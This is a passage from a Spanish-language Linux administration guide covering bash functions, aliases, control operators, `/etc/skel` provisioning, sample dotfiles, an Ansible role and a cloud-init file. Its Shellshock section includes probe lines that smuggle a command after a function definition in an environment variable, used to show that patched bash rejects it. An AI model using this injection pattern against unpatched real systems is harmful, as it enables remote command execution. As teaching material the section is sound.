| `local x=$(cmd)` | **El estado de salida es el de `local`, no el de `cmd`** — siempre `0` | Declarar y asignar en líneas separadas bajo `set -e` |
| `return N` | `0–255`, define `$?` | `exit` dentro de una función *leída con source* mata el shell de login |
| `declare -g` | Asignar una global desde dentro de una función | Bash 4.2+ |
| `local -n ref=name` | Nameref (paso por referencia) | Bash 4.3+; las referencias circulares dan error |
| `local -` | Guardar/restaurar `$-` mientras dure la función | Bash 4.4+; la forma limpia de hacer `set -e` localmente |
| `FUNCNAME`, `BASH_SOURCE`, `BASH_LINENO` | Arrays de la pila de llamadas | Índice 0 = marco actual |
| `declare -ft fn` / `set -o functrace` | Los traps `DEBUG`/`RETURN` se heredan dentro de la función | Necesario para los perfiladores de shell |

La trampa del estado de salida de `local`, demostrada porque derrota silenciosamente a `set -e` en código real:

```bash
$ f() { set -e; local v=$(false); echo "reached, status=$?"; }
$ f
reached, status=0
$ g() { set -e; local v; v=$(false); echo "NOT reached"; }
$ g
$ echo "g returned $?"
g returned 1
```

Introspección de la pila para reportar errores:

```bash
$ trace() { printf 'called from %s:%s in %s()\n' \
>     "${BASH_SOURCE[1]}" "${BASH_LINENO[0]}" "${FUNCNAME[1]}"; }
$ outer() { trace; }
$ outer
called from main:1 in outer()
```

### 5.3 Funciones exportadas y la lección de Shellshock

Bash puede exportar funciones a procesos bash hijos a través del entorno:

```bash
$ platform_region() { echo "eu-central-1"; }
$ export -f platform_region
$ bash -c 'platform_region'
eu-central-1

$ env | grep -A2 BASH_FUNC
BASH_FUNC_platform_region%%=() {  echo "eu-central-1"
}
```

Antes de los parches de 2014, la codificación era `platform_region=() { ...; }` — un nombre de variable de apariencia corriente. Cualquier proceso que copiara entrada no confiable a una variable de entorno (`mod_cgi` escribiendo `HTTP_*`, clientes DHCP, `ForceCommand` en `sshd`) le entregaba a bash una definición de función, y bash ejecutaba el texto que venía después de la llave de cierre. Eso es **CVE-2014-6271** ("Shellshock"), con los seguimientos CVE-2014-7169, 6277, 6278, 7186, 7187.

La corrección fue el espaciado de nombres: la forma importable ahora es `BASH_FUNC_name%%`, que el mangling del prefijo `HTTP_` de CGI no puede producir. Verificación en una compilación parcheada:

```bash
$ env 'x=() { :;}; echo VULNERABLE' bash -c 'echo probe-ok'
probe-ok
$ env 'BASH_FUNC_x%%=() { :;}; echo VULNERABLE' bash -c 'echo probe-ok'
bash: warning: BASH_FUNC_x%%: ignoring function definition attempt
bash: error importing function definition for `BASH_FUNC_x%%'
probe-ok
```

Conclusión operativa, y es más fuerte que "parcheá tus sistemas": **no uses `export -f` como arquitectura.** La exportación de funciones es un canal lateral de bash a bash invisible para una revisión del estilo `env | grep`, invisible para la inspección de unidades de `systemd`, y no disponible para ningún otro intérprete. Distribuí el código de shell compartido como un **archivo de biblioteca** que los consumidores leen explícitamente con source.

### 5.4 Alias frente a función frente a script — la tabla de selección

| Dimensión | Alias | Función | Script en el `PATH` |
|---|---|---|---|
| Acepta parámetros posicionales | ❌ (solo antepone texto) | ✅ `$1 $@ $#` | ✅ |
| Disponible en shells no interactivos | ❌ salvo `shopt -s expand_aliases` | ✅ si se lee con source o se exporta | ✅ siempre |
| Puede modificar el shell que llama (`cd`, `export`) | ✅ | ✅ | ❌ (proceso hijo) |
| Invocable desde `xargs`, `find -exec`, `sudo`, `systemd` | ❌ | ❌ | ✅ |
| Recursión / variables locales / códigos de retorno | ❌ | ✅ | ✅ |
| Costo de creación de proceso | ninguno | ninguno | un `fork`+`execve` |
| Testeable en CI (`bats`, `shellcheck`) | ✗ incómodo | ✓ vía source | ✓ nativamente |
| Descubrible (`man`, `--help`, empaquetado) | ✗ | ✗ | ✓ |
| Uso correcto | Atajos de tipeo interactivo, flags de seguridad | Mutación del estado del shell, ayudantes por sesión | **Cualquier cosa que invoque una máquina** |

**Regla de decisión:** si alguna vez lo va a invocar algo que no sea un humano, es un script. Los alias son ahorro de pulsaciones para una persona; las funciones existen porque un proceso hijo no puede cambiar el directorio ni el entorno del padre.

Mecánica de los alias que vale la pena conocer para el examen y para las roturas reales:

```bash
$ alias ll='ls -lh --color=auto'
$ alias
alias ll='ls -lh --color=auto'
alias ls='ls --color=auto'

$ alias sudo='sudo '            # trailing space -> next word IS alias-expanded
$ alias k=kubectl
$ sudo k get nodes              # works only because of that trailing space

$ unalias ll
$ unalias -a                    # remove every alias

$ cat > /tmp/t.sh <<'EOF'
alias hi='echo hello'
hi
EOF
$ bash /tmp/t.sh
/tmp/t.sh: line 2: hi: command not found
```

Esa última salida es la trampa canónica de los alias: **los alias se expanden cuando se lee una línea, no cuando se ejecuta**, y están deshabilitados en shells no interactivos. Dentro de un script, `alias` + uso inmediato nunca funciona. Usá una función.

### 5.5 Listas y operadores de control

Una *lista* es una secuencia de pipelines separados por `;`, `&`, `&&` o `||`, opcionalmente terminada por `;`, `&` o un salto de línea.

| Operador | Semántica | Estado de salida de la lista |
|---|---|---|
| `A ; B` | Secuencial, incondicional | estado de `B` |
| `A & B` | `A` asíncrono en un subshell, `B` inmediatamente | `0` para `A &`; `$!` guarda su PID |
| `A && B` | Ejecuta `B` solo si `A` devolvió `0` | el de `B` si se ejecutó, si no el de `A` |
| `A \|\| B` | Ejecuta `B` solo si `A` devolvió distinto de cero | el de `B` si se ejecutó, si no el de `A` |
| `A \| B` | Pipeline; ambos arrancan concurrentemente | el de `B`, salvo con `set -o pipefail` |
| `( A )` | Subshell: entorno y CWD aislados | el de `A` |
| `{ A ; }` | Agrupación en el shell **actual**; necesita el `;` final | el de `A` |
| `! A` | Negación | NOT lógico del de `A` |

Precedencia: `&&` y `||` tienen **igual** precedencia y asocian de izquierda a derecha. La consecuencia muerde:

```bash
$ true  && echo "OK" || echo "FAIL"
OK
$ false && echo "OK" || echo "FAIL"
FAIL
$ true  && false      || echo "FAIL"
FAIL                                    # the "ternary" is not a ternary
```

`a && b || c` **no** es if/else: si `b` falla, `c` se ejecuta igual. Usá `if` cuando la corrección importa.

Manejo del estado de un pipeline — obligatorio en cualquier script que use tuberías:

```bash
$ set -o pipefail
$ false | true ; echo "pipefail status: $?"
pipefail status: 1
$ set +o pipefail
$ false | true ; echo "default status:  $?"
default status:  0

$ curl -fsS https://bad.example/x | gzip -dc > /tmp/out ; echo "$?"
0
$ echo "${PIPESTATUS[@]}"
6 1
```

Este es exactamente el modo de falla contra el que CLAUDE.md advierte respecto de `tee`: **el estado de salida de un pipeline es el estado de salida de su último comando**. `generate | tee log` informa éxito aunque `generate` haya muerto.

### 5.6 El patrón de biblioteca: código de shell compartido que sobrevive a una revisión

```bash
$ sudo install -d -m 0755 /usr/local/lib/platform
$ sudo tee /usr/local/lib/platform/sre.sh >/dev/null <<'EOF'
# shellcheck shell=bash
# Platform SRE shell library. Sourced by /etc/profile.d/50-platform-lib.sh.
# Contract: defines only functions prefixed p_ or documented below. No side effects.

p_ctx() { kubectl config current-context 2>/dev/null || echo "-"; }

p_top() {
    local ns="${1:-$(kubectl config view --minify -o jsonpath='{..namespace}')}"
    kubectl top pod -n "${ns:-default}" --sort-by=memory 2>/dev/null \
        || printf 'p_top: metrics-server unavailable in %s\n' "${ns:-default}" >&2
}

p_env_diff() {
    # Compare the environment of two contexts. Usage: p_env_diff 'ssh h env' 'ssh h bash -lc env'
    diff --unified=0 <(eval "$1" | sort) <(eval "$2" | sort) || true
}
EOF
$ sudo chmod 0644 /usr/local/lib/platform/sre.sh
$ bash -n /usr/local/lib/platform/sre.sh && echo "syntax OK"
syntax OK
$ shellcheck -s bash /usr/local/lib/platform/sre.sh && echo "shellcheck clean"
shellcheck clean
```

Cargador — POSIX, protegido, idempotente:

```sh
$ sudo tee /etc/profile.d/50-platform-lib.sh >/dev/null <<'EOF'
# Load the platform shell library for interactive bash sessions only.
# POSIX sh compatible: /etc/profile is also read by dash on Debian.
case "$-" in
    *i*) ;;
    *)   return 0 2>/dev/null || exit 0 ;;
esac
[ -n "${BASH_VERSION-}" ] || return 0
[ -r /usr/local/lib/platform/sre.sh ] || return 0
[ -n "${PLATFORM_LIB_LOADED-}" ] && return 0
PLATFORM_LIB_LOADED=1
. /usr/local/lib/platform/sre.sh
EOF
```

---

## 6. `/etc/skel` y el aprovisionamiento de cuentas

### 6.1 Mecánica

`/etc/skel` es un directorio plantilla. `useradd -m` copia su contenido (recursivamente, incluidos dotfiles y subdirectorios) al nuevo directorio home, y luego hace `chown` del resultado al nuevo usuario y grupo. Los permisos de los archivos copiados se preservan del esqueleto; el *directorio home en sí* se crea con `HOME_MODE` (o `0777 & ~UMASK`) de `/etc/login.defs`.

```bash
$ grep -vE '^\s*#|^\s*$' /etc/default/useradd
GROUP=100
HOME=/home
INACTIVE=-1
EXPIRE=
SHELL=/bin/bash
SKEL=/etc/skel
CREATE_MAIL_SPOOL=yes

$ grep -E '^(UMASK|HOME_MODE|CREATE_HOME|USERGROUPS_ENAB)' /etc/login.defs
UMASK		022
HOME_MODE	0700
USERGROUPS_ENAB yes

$ ls -la /etc/skel
total 24
drwxr-xr-x   2 root root 4096 Aug 20 09:12 .
drwxr-xr-x 142 root root 12288 Aug 26 08:03 ..
-rw-r--r--   1 root root  220 Mar 31 08:41 .bash_logout
-rw-r--r--   1 root root 3771 Mar 31 08:41 .bashrc
-rw-r--r--   1 root root  807 Mar 31 08:41 .profile
```

Creación y verificación:

```bash
$ sudo useradd -m -s /bin/bash -c 'Platform SRE' -G sudo,docker sre02
$ sudo ls -la /home/sre02
total 24
drwx------ 2 sre02 sre02 4096 Aug 26 10:41 .
drwxr-xr-x 6 root  root  4096 Aug 26 10:41 ..
-rw-r--r-- 1 sre02 sre02  220 Aug 26 10:41 .bash_logout
-rw-r--r-- 1 sre02 sre02 3771 Aug 26 10:41 .bashrc
-rw-r--r-- 1 sre02 sre02  807 Aug 26 10:41 .profile

$ getent passwd sre02
sre02:x:1002:1002:Platform SRE:/home/sre02:/bin/bash

# Use a non-default skeleton for a role account
$ sudo useradd -m -k /etc/skel.svc -s /usr/sbin/nologin -d /srv/exporter svc-exporter
$ sudo ls -A /srv/exporter
.profile
```

El `adduser` de más alto nivel de Debian lee su propia configuración y puede filtrar qué archivos del esqueleto se copian:

```bash
$ grep -E '^(SKEL|SKEL_IGNORE_REGEX|DIR_MODE|DHOME|DSHELL)' /etc/adduser.conf
DSHELL=/bin/bash
DHOME=/home
SKEL=/etc/skel
SKEL_IGNORE_REGEX="dpkg-(old|new|dist|save)"
DIR_MODE=0700
```

### 6.2 Comparación de rutas de aprovisionamiento

| Ruta | Consume `/etc/skel` | Cuándo se crea el home | Uso típico |
|---|:---:|---|---|
| `useradd -m` | ✅ (`SKEL=` en `/etc/default/useradd`, se sobrescribe con `-k`) | Al crear la cuenta | Aprovisionamiento por script, módulo `user` de Ansible |
| `useradd -M` | ❌ | Nunca | Cuentas de servicio con una ruta `/srv` preexistente |
| `adduser` (Debian, Perl) | ✅ (`SKEL` en `adduser.conf`, `SKEL_IGNORE_REGEX`) | Al crear la cuenta | Administración interactiva |
| `pam_mkhomedir.so` | ✅ (opción `skel=`) | **En el primer login** | Usuarios LDAP / SSSD / AD sin cuenta local |
| `oddjob-mkhomedir` (RHEL) | ✅ | En el primer login, vía D-Bus, consciente de SELinux | RHEL con SELinux en enforcing |
| `systemd-homed` (`homectl`) | ❌ | Al crear, desde su propia plantilla | Áreas home portables/cifradas |
| `users:` de cloud-init | ✅ (llama a `useradd -m`) | En el primer arranque | Imágenes inmutables |

`pam_mkhomedir` para identidades respaldadas por un directorio:

```bash
$ sudo grep -rn mkhomedir /etc/pam.d/common-session
/etc/pam.d/common-session:26:session optional pam_mkhomedir.so skel=/etc/skel umask=0077

# RHEL / Fedora — do not hand-edit the PAM stack, use authselect
$ sudo authselect enable-feature with-mkhomedir
$ sudo systemctl enable --now oddjobd
$ sudo authselect current
Profile ID: sssd
Enabled features:
- with-mkhomedir
```

Verificación de que efectivamente se disparó:

```bash
$ ssh ldapuser@node01 'ls -ld ~; ls -A ~'
Creating home directory for ldapuser.
drwx------ 2 ldapuser domain users 4096 Aug 26 10:55 /home/ldapuser
.bash_logout
.bashrc
.profile
```

### 6.3 La falla arquitectónica: `/etc/skel` no es un canal de gestión de configuración

`/etc/skel` **no tiene bucle de reconciliación**. Se lee exactamente una vez por cuenta, al crearla. Editarlo no cambia nada en ninguna cuenta existente de ningún host, y no hay comando que lo vuelva a aplicar. Esto produce el incidente arquetipo 3 de §1.1 y es el punto de diseño más importante de este objetivo.

| Requisito | `/etc/skel` | `/etc/profile.d` + `/etc/bash.bashrc` |
|---|---|---|
| Aplica a usuarios existentes | ❌ | ✅ |
| Aplica a usuarios creados mañana | ✅ | ✅ |
| El usuario puede sobrescribirlo localmente | ✅ (es su archivo) | ✅ (más adelante en la cadena) |
| Convergente / idempotente | ❌ de una sola vez | ✅ en cada login |
| Auditable ("¿qué está corriendo la flota?") | ❌ N copias, N versiones | ✅ un archivo, con checksum |
| Removible de forma centralizada | ❌ requiere tocar N homes | ✅ borrar el drop-in |
| Contenido correcto | *Semillas* personales que se espera que el usuario edite | *Política* de plataforma |

**La regla:** el comportamiento de plataforma va en `/etc/profile.d/*.sh` y `/etc/bash.bashrc`, gestionado por gestión de configuración. `/etc/skel` lleva solo los archivos iniciales mínimos que se invita al usuario a personalizar — y aun así debe gestionarse como código, para que los hosts nuevos y los existentes coincidan.

Reconciliar la deriva cuando la regla fue violada (medí antes de cambiar nada):

```bash
$ sudo bash -c '
for h in /home/*; do
  u=$(basename "$h")
  [ -f "$h/.bashrc" ] || { printf "%-12s MISSING\n" "$u"; continue; }
  if cmp -s "$h/.bashrc" /etc/skel/.bashrc; then
    printf "%-12s pristine\n" "$u"
  else
    printf "%-12s drifted (%s lines differ)\n" "$u" \
      "$(diff "$h/.bashrc" /etc/skel/.bashrc | grep -c "^[<>]")"
  fi
done'
alice        pristine
bob          drifted (14 lines differ)
carol        drifted (3 lines differ)
sre02        pristine
svc-exporter MISSING
```

Nunca sobrescribas un `~/.bashrc` con deriva — son datos del usuario. Distribuí la capa de plataforma por `/etc/profile.d` y dejá los archivos personales tranquilos.

### 6.4 Un esqueleto completo, de producción

`/etc/skel/.bash_profile` — el punto de entrada del shell de login:

```bash
# ~/.bash_profile — executed by bash(1) for LOGIN shells.
#
# Order of evaluation for a login shell:
#   /etc/profile -> /etc/profile.d/*.sh -> THIS FILE
# ~/.bashrc is NOT read automatically by a login shell; the hook below does it.
#
# Put EXPORTED variables here (inherited by children).
# Put aliases, prompt and shopt in ~/.bashrc (not inherited, re-created per shell).

# 1. Personal bin directory, prepended, idempotently.
case ":${PATH}:" in
    *":${HOME}/.local/bin:"*) ;;
    *) PATH="${HOME}/.local/bin${PATH:+:${PATH}}" ;;
esac
export PATH

# 2. Session-wide preferences.
export EDITOR="${EDITOR:-vim}"
export VISUAL="$EDITOR"
export PAGER="${PAGER:-less}"
export LESS="-R -F -X -i"

# 3. XDG base directories (freedesktop.org spec).
export XDG_CONFIG_HOME="${XDG_CONFIG_HOME:-$HOME/.config}"
export XDG_CACHE_HOME="${XDG_CACHE_HOME:-$HOME/.cache}"
export XDG_DATA_HOME="${XDG_DATA_HOME:-$HOME/.local/share}"

# 4. THE HOOK: a login shell must source ~/.bashrc explicitly.
if [ -n "${BASH_VERSION-}" ] && [ -f "$HOME/.bashrc" ]; then
    . "$HOME/.bashrc"
fi
```

`/etc/skel/.bashrc` — el punto de entrada interactivo:

```bash
# ~/.bashrc — executed by bash(1) for INTERACTIVE, NON-LOGIN shells,
# and also for non-interactive shells started by sshd (network-connection case).
#
# CRITICAL: this file MUST produce no output when non-interactive.
# scp/sftp/rsync speak a binary protocol over that same stream; any stray
# byte written here corrupts the transfer ("protocol error: unexpected tag").

# --- Guard: bail out immediately if not interactive. Keep this FIRST. ---
case $- in
    *i*) ;;
      *) return ;;
esac

# --- Global definitions (RHEL/Fedora ship these; Debian compiles SYS_BASHRC) ---
if [ -f /etc/bashrc ]; then
    . /etc/bashrc
fi

# --- History: an operator convenience, NOT an audit log. Use auditd for that. ---
HISTCONTROL=ignoreboth:erasedups   # skip leading-space cmds and duplicates
HISTSIZE=100000                    # in-memory entries
HISTFILESIZE=200000                # on-disk entries
HISTTIMEFORMAT='%F %T '            # timestamps in `history` output
HISTIGNORE='ls:ll:pwd:exit:clear:history'
shopt -s histappend                # append, never truncate, on shell exit
shopt -s cmdhist                   # multi-line commands as one history entry

# --- Shell behaviour ---
shopt -s checkwinsize              # update LINES/COLUMNS after each command
shopt -s globstar                  # ** matches across directories
shopt -s no_empty_cmd_completion   # do not scan PATH on an empty TAB
shopt -s checkhash                 # verify hashed paths still exist
set -o noclobber                   # `>` refuses to truncate; use `>|` to force

# --- Prompt --------------------------------------------------------------
# \[ \] mark non-printing sequences so readline computes the line width
# correctly; omitting them is what makes long command lines wrap wrongly.
if [ -x /usr/bin/tput ] && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    if [ "$(id -u)" -eq 0 ]; then
        PS1='\[\e[1;31m\]\u@\h\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]# '
    else
        PS1='\[\e[1;32m\]\u@\h\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]\$ '
    fi
else
    PS1='\u@\h:\w\$ '
fi
PS2='> '
PS4='+ ${BASH_SOURCE[0]:-main}:${LINENO}:${FUNCNAME[0]:-main}: '

# Keep PROMPT_COMMAND cheap: it runs before EVERY prompt. No git, no network.
PROMPT_COMMAND='history -a'

# --- Aliases: interactive typing only. Scripts must never rely on these. ---
alias ls='ls --color=auto'
alias ll='ls -lah --color=auto'
alias grep='grep --color=auto'
alias df='df -hT'
alias free='free -h'
alias ip='ip -color=auto'
alias rm='rm -I --preserve-root'   # -I prompts once for >3 files; -i is noisy
alias cp='cp -i'
alias mv='mv -i'

# --- Functions: anything needing arguments or shell-state mutation ---------
mkcd() { mkdir -p -- "$1" && cd -- "$1" || return 1; }

up() {                              # up 3  ->  cd ../../..
    local n="${1:-1}" p=""
    while [ "$n" -gt 0 ]; do p="../$p"; n=$((n - 1)); done
    cd -- "${p:-.}" || return 1
}

extract() {
    [ -f "$1" ] || { printf 'extract: no such file: %s\n' "$1" >&2; return 1; }
    case "$1" in
        *.tar.bz2|*.tbz2) tar xjf "$1" ;;
        *.tar.gz|*.tgz)   tar xzf "$1" ;;
        *.tar.xz)         tar xJf "$1" ;;
        *.tar.zst)        tar --zstd -xf "$1" ;;
        *.tar)            tar xf  "$1" ;;
        *.gz)             gunzip  "$1" ;;
        *.bz2)            bunzip2 "$1" ;;
        *.zip)            unzip   "$1" ;;
        *)  printf 'extract: unsupported format: %s\n' "$1" >&2; return 2 ;;
    esac
}

# --- Completion (guarded: absent in minimal images) -----------------------
if ! shopt -oq posix; then
    if [ -f /usr/share/bash-completion/bash_completion ]; then
        . /usr/share/bash-completion/bash_completion
    elif [ -f /etc/bash_completion ]; then
        . /etc/bash_completion
    fi
fi

# --- Local, unmanaged overrides. Keep this LAST. --------------------------
[ -f "$HOME/.bashrc.local" ] && . "$HOME/.bashrc.local"
```

`/etc/skel/.bash_logout`:

```bash
# ~/.bash_logout — executed when an INTERACTIVE LOGIN shell exits.
# Not executed for `ssh host cmd`, cron, systemd, or non-login shells:
# never rely on it for anything that must happen.

# Flush in-memory history now rather than losing it on an abrupt disconnect.
history -a 2>/dev/null

# Clear the console on a physical/virtual terminal so the next user
# cannot scroll back through the previous session.
case "$(tty)" in
    /dev/tty[0-9]*) [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q ;;
esac
```

`/etc/skel/.profile` — para usuarios cuyo shell no es bash (`dash`, `sh`), y como respaldo cuando `~/.bash_profile` no existe:

```sh
# ~/.profile — POSIX sh. Read by login shells when ~/.bash_profile and
# ~/.bash_login do not exist. Must contain NO bashisms: it is also read by dash.

case ":${PATH}:" in
    *":$HOME/.local/bin:"*) ;;
    *) PATH="$HOME/.local/bin${PATH:+:$PATH}" ;;
esac
export PATH

EDITOR=vi; export EDITOR
PAGER=less; export PAGER

# If this login shell happens to be bash, hand off to ~/.bashrc.
if [ -n "${BASH_VERSION-}" ] && [ -f "$HOME/.bashrc" ]; then
    . "$HOME/.bashrc"
fi
```

---

## 7. Manifiestos de infraestructura

### 7.1 Rol de Ansible — el bucle de reconciliación de toda la capa

`roles/shell_environment/defaults/main.yml`:

```yaml
---
# roles/shell_environment/defaults/main.yml
shell_env_toolchain_dir: /opt/toolchain/bin
shell_env_lib_dir: /usr/local/lib/platform
shell_env_idle_timeout: 900          # seconds; 0 disables (CIS 5.4.5 style control)
shell_env_locale: en_US.UTF-8
shell_env_umask: "0027"

shell_env_exports:
  PLATFORM_REGION: eu-central-1
  PLATFORM_ENV: production
  KUBE_EDITOR: "vim"
  DOCKER_BUILDKIT: "1"

shell_env_no_proxy: "localhost,127.0.0.1,::1,.svc,.cluster.local,10.0.0.0/8,169.254.169.254"
shell_env_https_proxy: "http://proxy.corp.internal:3128"

shell_env_skel_files:
  - .bash_profile
  - .bashrc
  - .bash_logout
  - .profile

shell_env_manage_secure_path: true
shell_env_secure_path: >-
  /opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

`roles/shell_environment/tasks/main.yml`:

```yaml
---
# roles/shell_environment/tasks/main.yml
- name: Assert supported platform
  ansible.builtin.assert:
    that:
      - ansible_facts['os_family'] in ['Debian', 'RedHat', 'Suse']
    fail_msg: >-
      shell_environment supports Debian, RedHat and Suse families only;
      got {{ ansible_facts['os_family'] }}
    quiet: true

- name: Ensure the platform library directory exists
  ansible.builtin.file:
    path: "{{ shell_env_lib_dir }}"
    state: directory
    owner: root
    group: root
    mode: "0755"

- name: Deploy the platform shell library
  ansible.builtin.copy:
    src: sre.sh
    dest: "{{ shell_env_lib_dir }}/sre.sh"
    owner: root
    group: root
    mode: "0644"
    validate: "bash -n %s"

# --- Layer 1: pam_env -- reaches cron and every non-shell PAM session -------
- name: Manage /etc/environment entries (pam_env, not a shell script)
  ansible.builtin.lineinfile:
    path: /etc/environment
    regexp: "^{{ item.key }}="
    line: '{{ item.key }}="{{ item.value }}"'
    owner: root
    group: root
    mode: "0644"
    create: true
  loop:
    - { key: LANG,        value: "{{ shell_env_locale }}" }
    - { key: HTTPS_PROXY, value: "{{ shell_env_https_proxy }}" }
    - { key: https_proxy, value: "{{ shell_env_https_proxy }}" }
    - { key: NO_PROXY,    value: "{{ shell_env_no_proxy }}" }
    - { key: no_proxy,    value: "{{ shell_env_no_proxy }}" }
  loop_control:
    label: "{{ item.key }}"

# --- Layer 2: /etc/profile.d -- login shells, exported, POSIX sh ------------
- name: Deploy the platform PATH drop-in
  ansible.builtin.template:
    src: 10-platform-path.sh.j2
    dest: /etc/profile.d/10-platform-path.sh
    owner: root
    group: root
    mode: "0644"
    validate: "sh -n %s"        # POSIX check: this file is also read by dash

- name: Deploy the platform exports drop-in
  ansible.builtin.template:
    src: 20-platform-exports.sh.j2
    dest: /etc/profile.d/20-platform-exports.sh
    owner: root
    group: root
    mode: "0644"
    validate: "sh -n %s"

- name: Deploy the library loader drop-in
  ansible.builtin.copy:
    src: 50-platform-lib.sh
    dest: /etc/profile.d/50-platform-lib.sh
    owner: root
    group: root
    mode: "0644"
    validate: "sh -n %s"

# --- Layer 3: interactive policy -------------------------------------------
- name: Deploy the interactive shell policy drop-in
  ansible.builtin.template:
    src: 90-platform-interactive.sh.j2
    dest: /etc/profile.d/90-platform-interactive.sh
    owner: root
    group: root
    mode: "0644"
    validate: "sh -n %s"

# --- Layer 4: skeleton for FUTURE accounts only -----------------------------
- name: Deploy skeleton files for newly created accounts
  ansible.builtin.copy:
    src: "skel/{{ item }}"
    dest: "/etc/skel/{{ item }}"
    owner: root
    group: root
    mode: "0644"
    validate: "bash -n %s"
  loop: "{{ shell_env_skel_files }}"

- name: Pin the skeleton directory used by useradd
  ansible.builtin.lineinfile:
    path: /etc/default/useradd
    regexp: '^SKEL='
    line: 'SKEL=/etc/skel'
    owner: root
    group: root
    mode: "0644"
  when: ansible_facts['os_family'] in ['RedHat', 'Suse']

- name: Enforce a private home directory mode for new accounts
  ansible.builtin.lineinfile:
    path: /etc/login.defs
    regexp: '^#?\s*HOME_MODE\b'
    line: "HOME_MODE\t0700"
    owner: root
    group: root
    mode: "0644"

# --- Layer 5: privileged PATH ----------------------------------------------
- name: Manage the sudo secure_path drop-in
  ansible.builtin.copy:
    dest: /etc/sudoers.d/20-platform-path
    content: |
      # Managed by Ansible role shell_environment. Do not edit.
      Defaults    secure_path="{{ shell_env_secure_path }}"
    owner: root
    group: root
    mode: "0440"
    validate: "visudo -cf %s"    # a bad sudoers file locks you out of root
  when: shell_env_manage_secure_path | bool

# --- Verification: the role proves its own effect ---------------------------
- name: Verify a login shell resolves the toolchain
  ansible.builtin.command:
    argv: [/bin/bash, -lc, 'command -v platformctl']
  register: shell_env_probe
  changed_when: false
  failed_when: shell_env_probe.rc != 0

- name: Verify /etc/profile.d contains no bashisms
  ansible.builtin.command:
    argv: [/bin/sh, -n, "/etc/profile.d/{{ item }}"]
  loop:
    - 10-platform-path.sh
    - 20-platform-exports.sh
    - 50-platform-lib.sh
    - 90-platform-interactive.sh
  changed_when: false

- name: Verify ~/.bashrc emits nothing on a non-interactive SSH-style invocation
  ansible.builtin.shell:
    cmd: |
      set -o pipefail
      out=$(HOME=/etc/skel bash --rcfile /etc/skel/.bashrc -c 'true' 2>&1)
      if [ -n "$out" ]; then
          printf 'bashrc produced output when non-interactive: %s\n' "$out" >&2
          exit 1
      fi
    executable: /bin/bash
  changed_when: false
```

`roles/shell_environment/templates/10-platform-path.sh.j2`:

```sh
# {{ ansible_managed }}
# /etc/profile.d/10-platform-path.sh
# POSIX sh ONLY: on Debian-family systems /etc/profile is also read by dash.

path_prepend() {
    [ -d "$1" ] || return 0
    case ":${PATH}:" in
        *":$1:"*) return 0 ;;
    esac
    PATH="$1${PATH:+:$PATH}"
}

path_append() {
    [ -d "$1" ] || return 0
    case ":${PATH}:" in
        *":$1:"*) return 0 ;;
    esac
    PATH="${PATH:+$PATH:}$1"
}

path_prepend "{{ shell_env_toolchain_dir }}"
path_append  "/opt/platform/sbin"

# A privileged shell also gets the sbin directories.
if [ "$(id -u)" -eq 0 ]; then
    path_append "/usr/local/sbin"
    path_append "/usr/sbin"
    path_append "/sbin"
fi

export PATH
unset -f path_prepend path_append
```

`roles/shell_environment/templates/20-platform-exports.sh.j2`:

```sh
# {{ ansible_managed }}
# /etc/profile.d/20-platform-exports.sh
{% for k, v in shell_env_exports.items() %}
{{ k }}="{{ v }}"; export {{ k }}
{% endfor %}

# Deterministic collation for anything a script parses.
# Humans keep their locale via /etc/environment; scripts override with LC_ALL=C.
LC_COLLATE=C; export LC_COLLATE
```

`roles/shell_environment/templates/90-platform-interactive.sh.j2`:

```sh
# {{ ansible_managed }}
# /etc/profile.d/90-platform-interactive.sh
# Interactive-only policy. Guard first, so scp/rsync streams stay clean.
case "$-" in
    *i*) ;;
    *)   return 0 2>/dev/null || exit 0 ;;
esac

umask {{ shell_env_umask }}

{% if shell_env_idle_timeout | int > 0 %}
# Idle-session timeout. readonly makes it a policy speed bump, not a control:
# a determined user can still `exec bash --norc`. Pair with sshd ClientAliveInterval.
TMOUT={{ shell_env_idle_timeout }}
readonly TMOUT
export TMOUT
{% endif %}

# Motd-style context marker: which cluster is this shell pointed at?
if [ -n "${BASH_VERSION-}" ] && [ -r /etc/platform/context ]; then
    printf '\033[1;33m[%s]\033[0m %s\n' \
        "$(cat /etc/platform/context)" "$(uname -srm)"
fi
```

Ejecutalo y leé la salida con espíritu crítico:

```bash
$ ansible-playbook -i inventories/prod site.yml --tags shell_env --check --diff
...
TASK [shell_environment : Deploy the platform PATH drop-in] *********************
--- before: /etc/profile.d/10-platform-path.sh
+++ after: /etc/profile.d/10-platform-path.sh
@@ -14,7 +14,7 @@
-path_prepend "/opt/toolchain/bin"
+path_prepend "/opt/toolchain/bin"
+path_append  "/opt/platform/sbin"
changed: [node01]

TASK [shell_environment : Verify a login shell resolves the toolchain] **********
ok: [node01]

PLAY RECAP *********************************************************************
node01  : ok=15  changed=1  unreachable=0  failed=0  skipped=1  rescued=0  ignored=0
```

### 7.2 cloud-init — aprovisionamiento en el primer arranque de una imagen inmutable

```yaml
#cloud-config
# /var/lib/cloud/seed/nocloud/user-data
hostname: node-{{ ds.meta_data.instance_id }}
manage_etc_hosts: true
locale: en_US.UTF-8
timezone: UTC

users:
  - name: sre
    gecos: Platform SRE
    primary_group: sre
    groups: [sudo, adm, systemd-journal]
    shell: /bin/bash
    sudo: "ALL=(ALL:ALL) NOPASSWD:ALL"
    lock_passwd: true
    ssh_authorized_keys:
      - "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKp3n0Yq8QF1Wm2sJm5cQK9v0dQ2rC8t sre@bastion"

write_files:
  - path: /etc/environment
    owner: root:root
    permissions: "0644"
    content: |
      LANG=en_US.UTF-8
      PATH="/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
      NO_PROXY="localhost,127.0.0.1,::1,.svc,.cluster.local,10.0.0.0/8,169.254.169.254"

  - path: /etc/profile.d/10-platform-path.sh
    owner: root:root
    permissions: "0644"
    content: |
      # POSIX sh only: /etc/profile is read by dash on Debian.
      path_prepend() {
          [ -d "$1" ] || return 0
          case ":${PATH}:" in *":$1:"*) return 0 ;; esac
          PATH="$1${PATH:+:$PATH}"
      }
      path_prepend /opt/toolchain/bin
      export PATH
      unset -f path_prepend

  - path: /etc/profile.d/20-platform-exports.sh
    owner: root:root
    permissions: "0644"
    content: |
      PLATFORM_REGION=eu-central-1; export PLATFORM_REGION
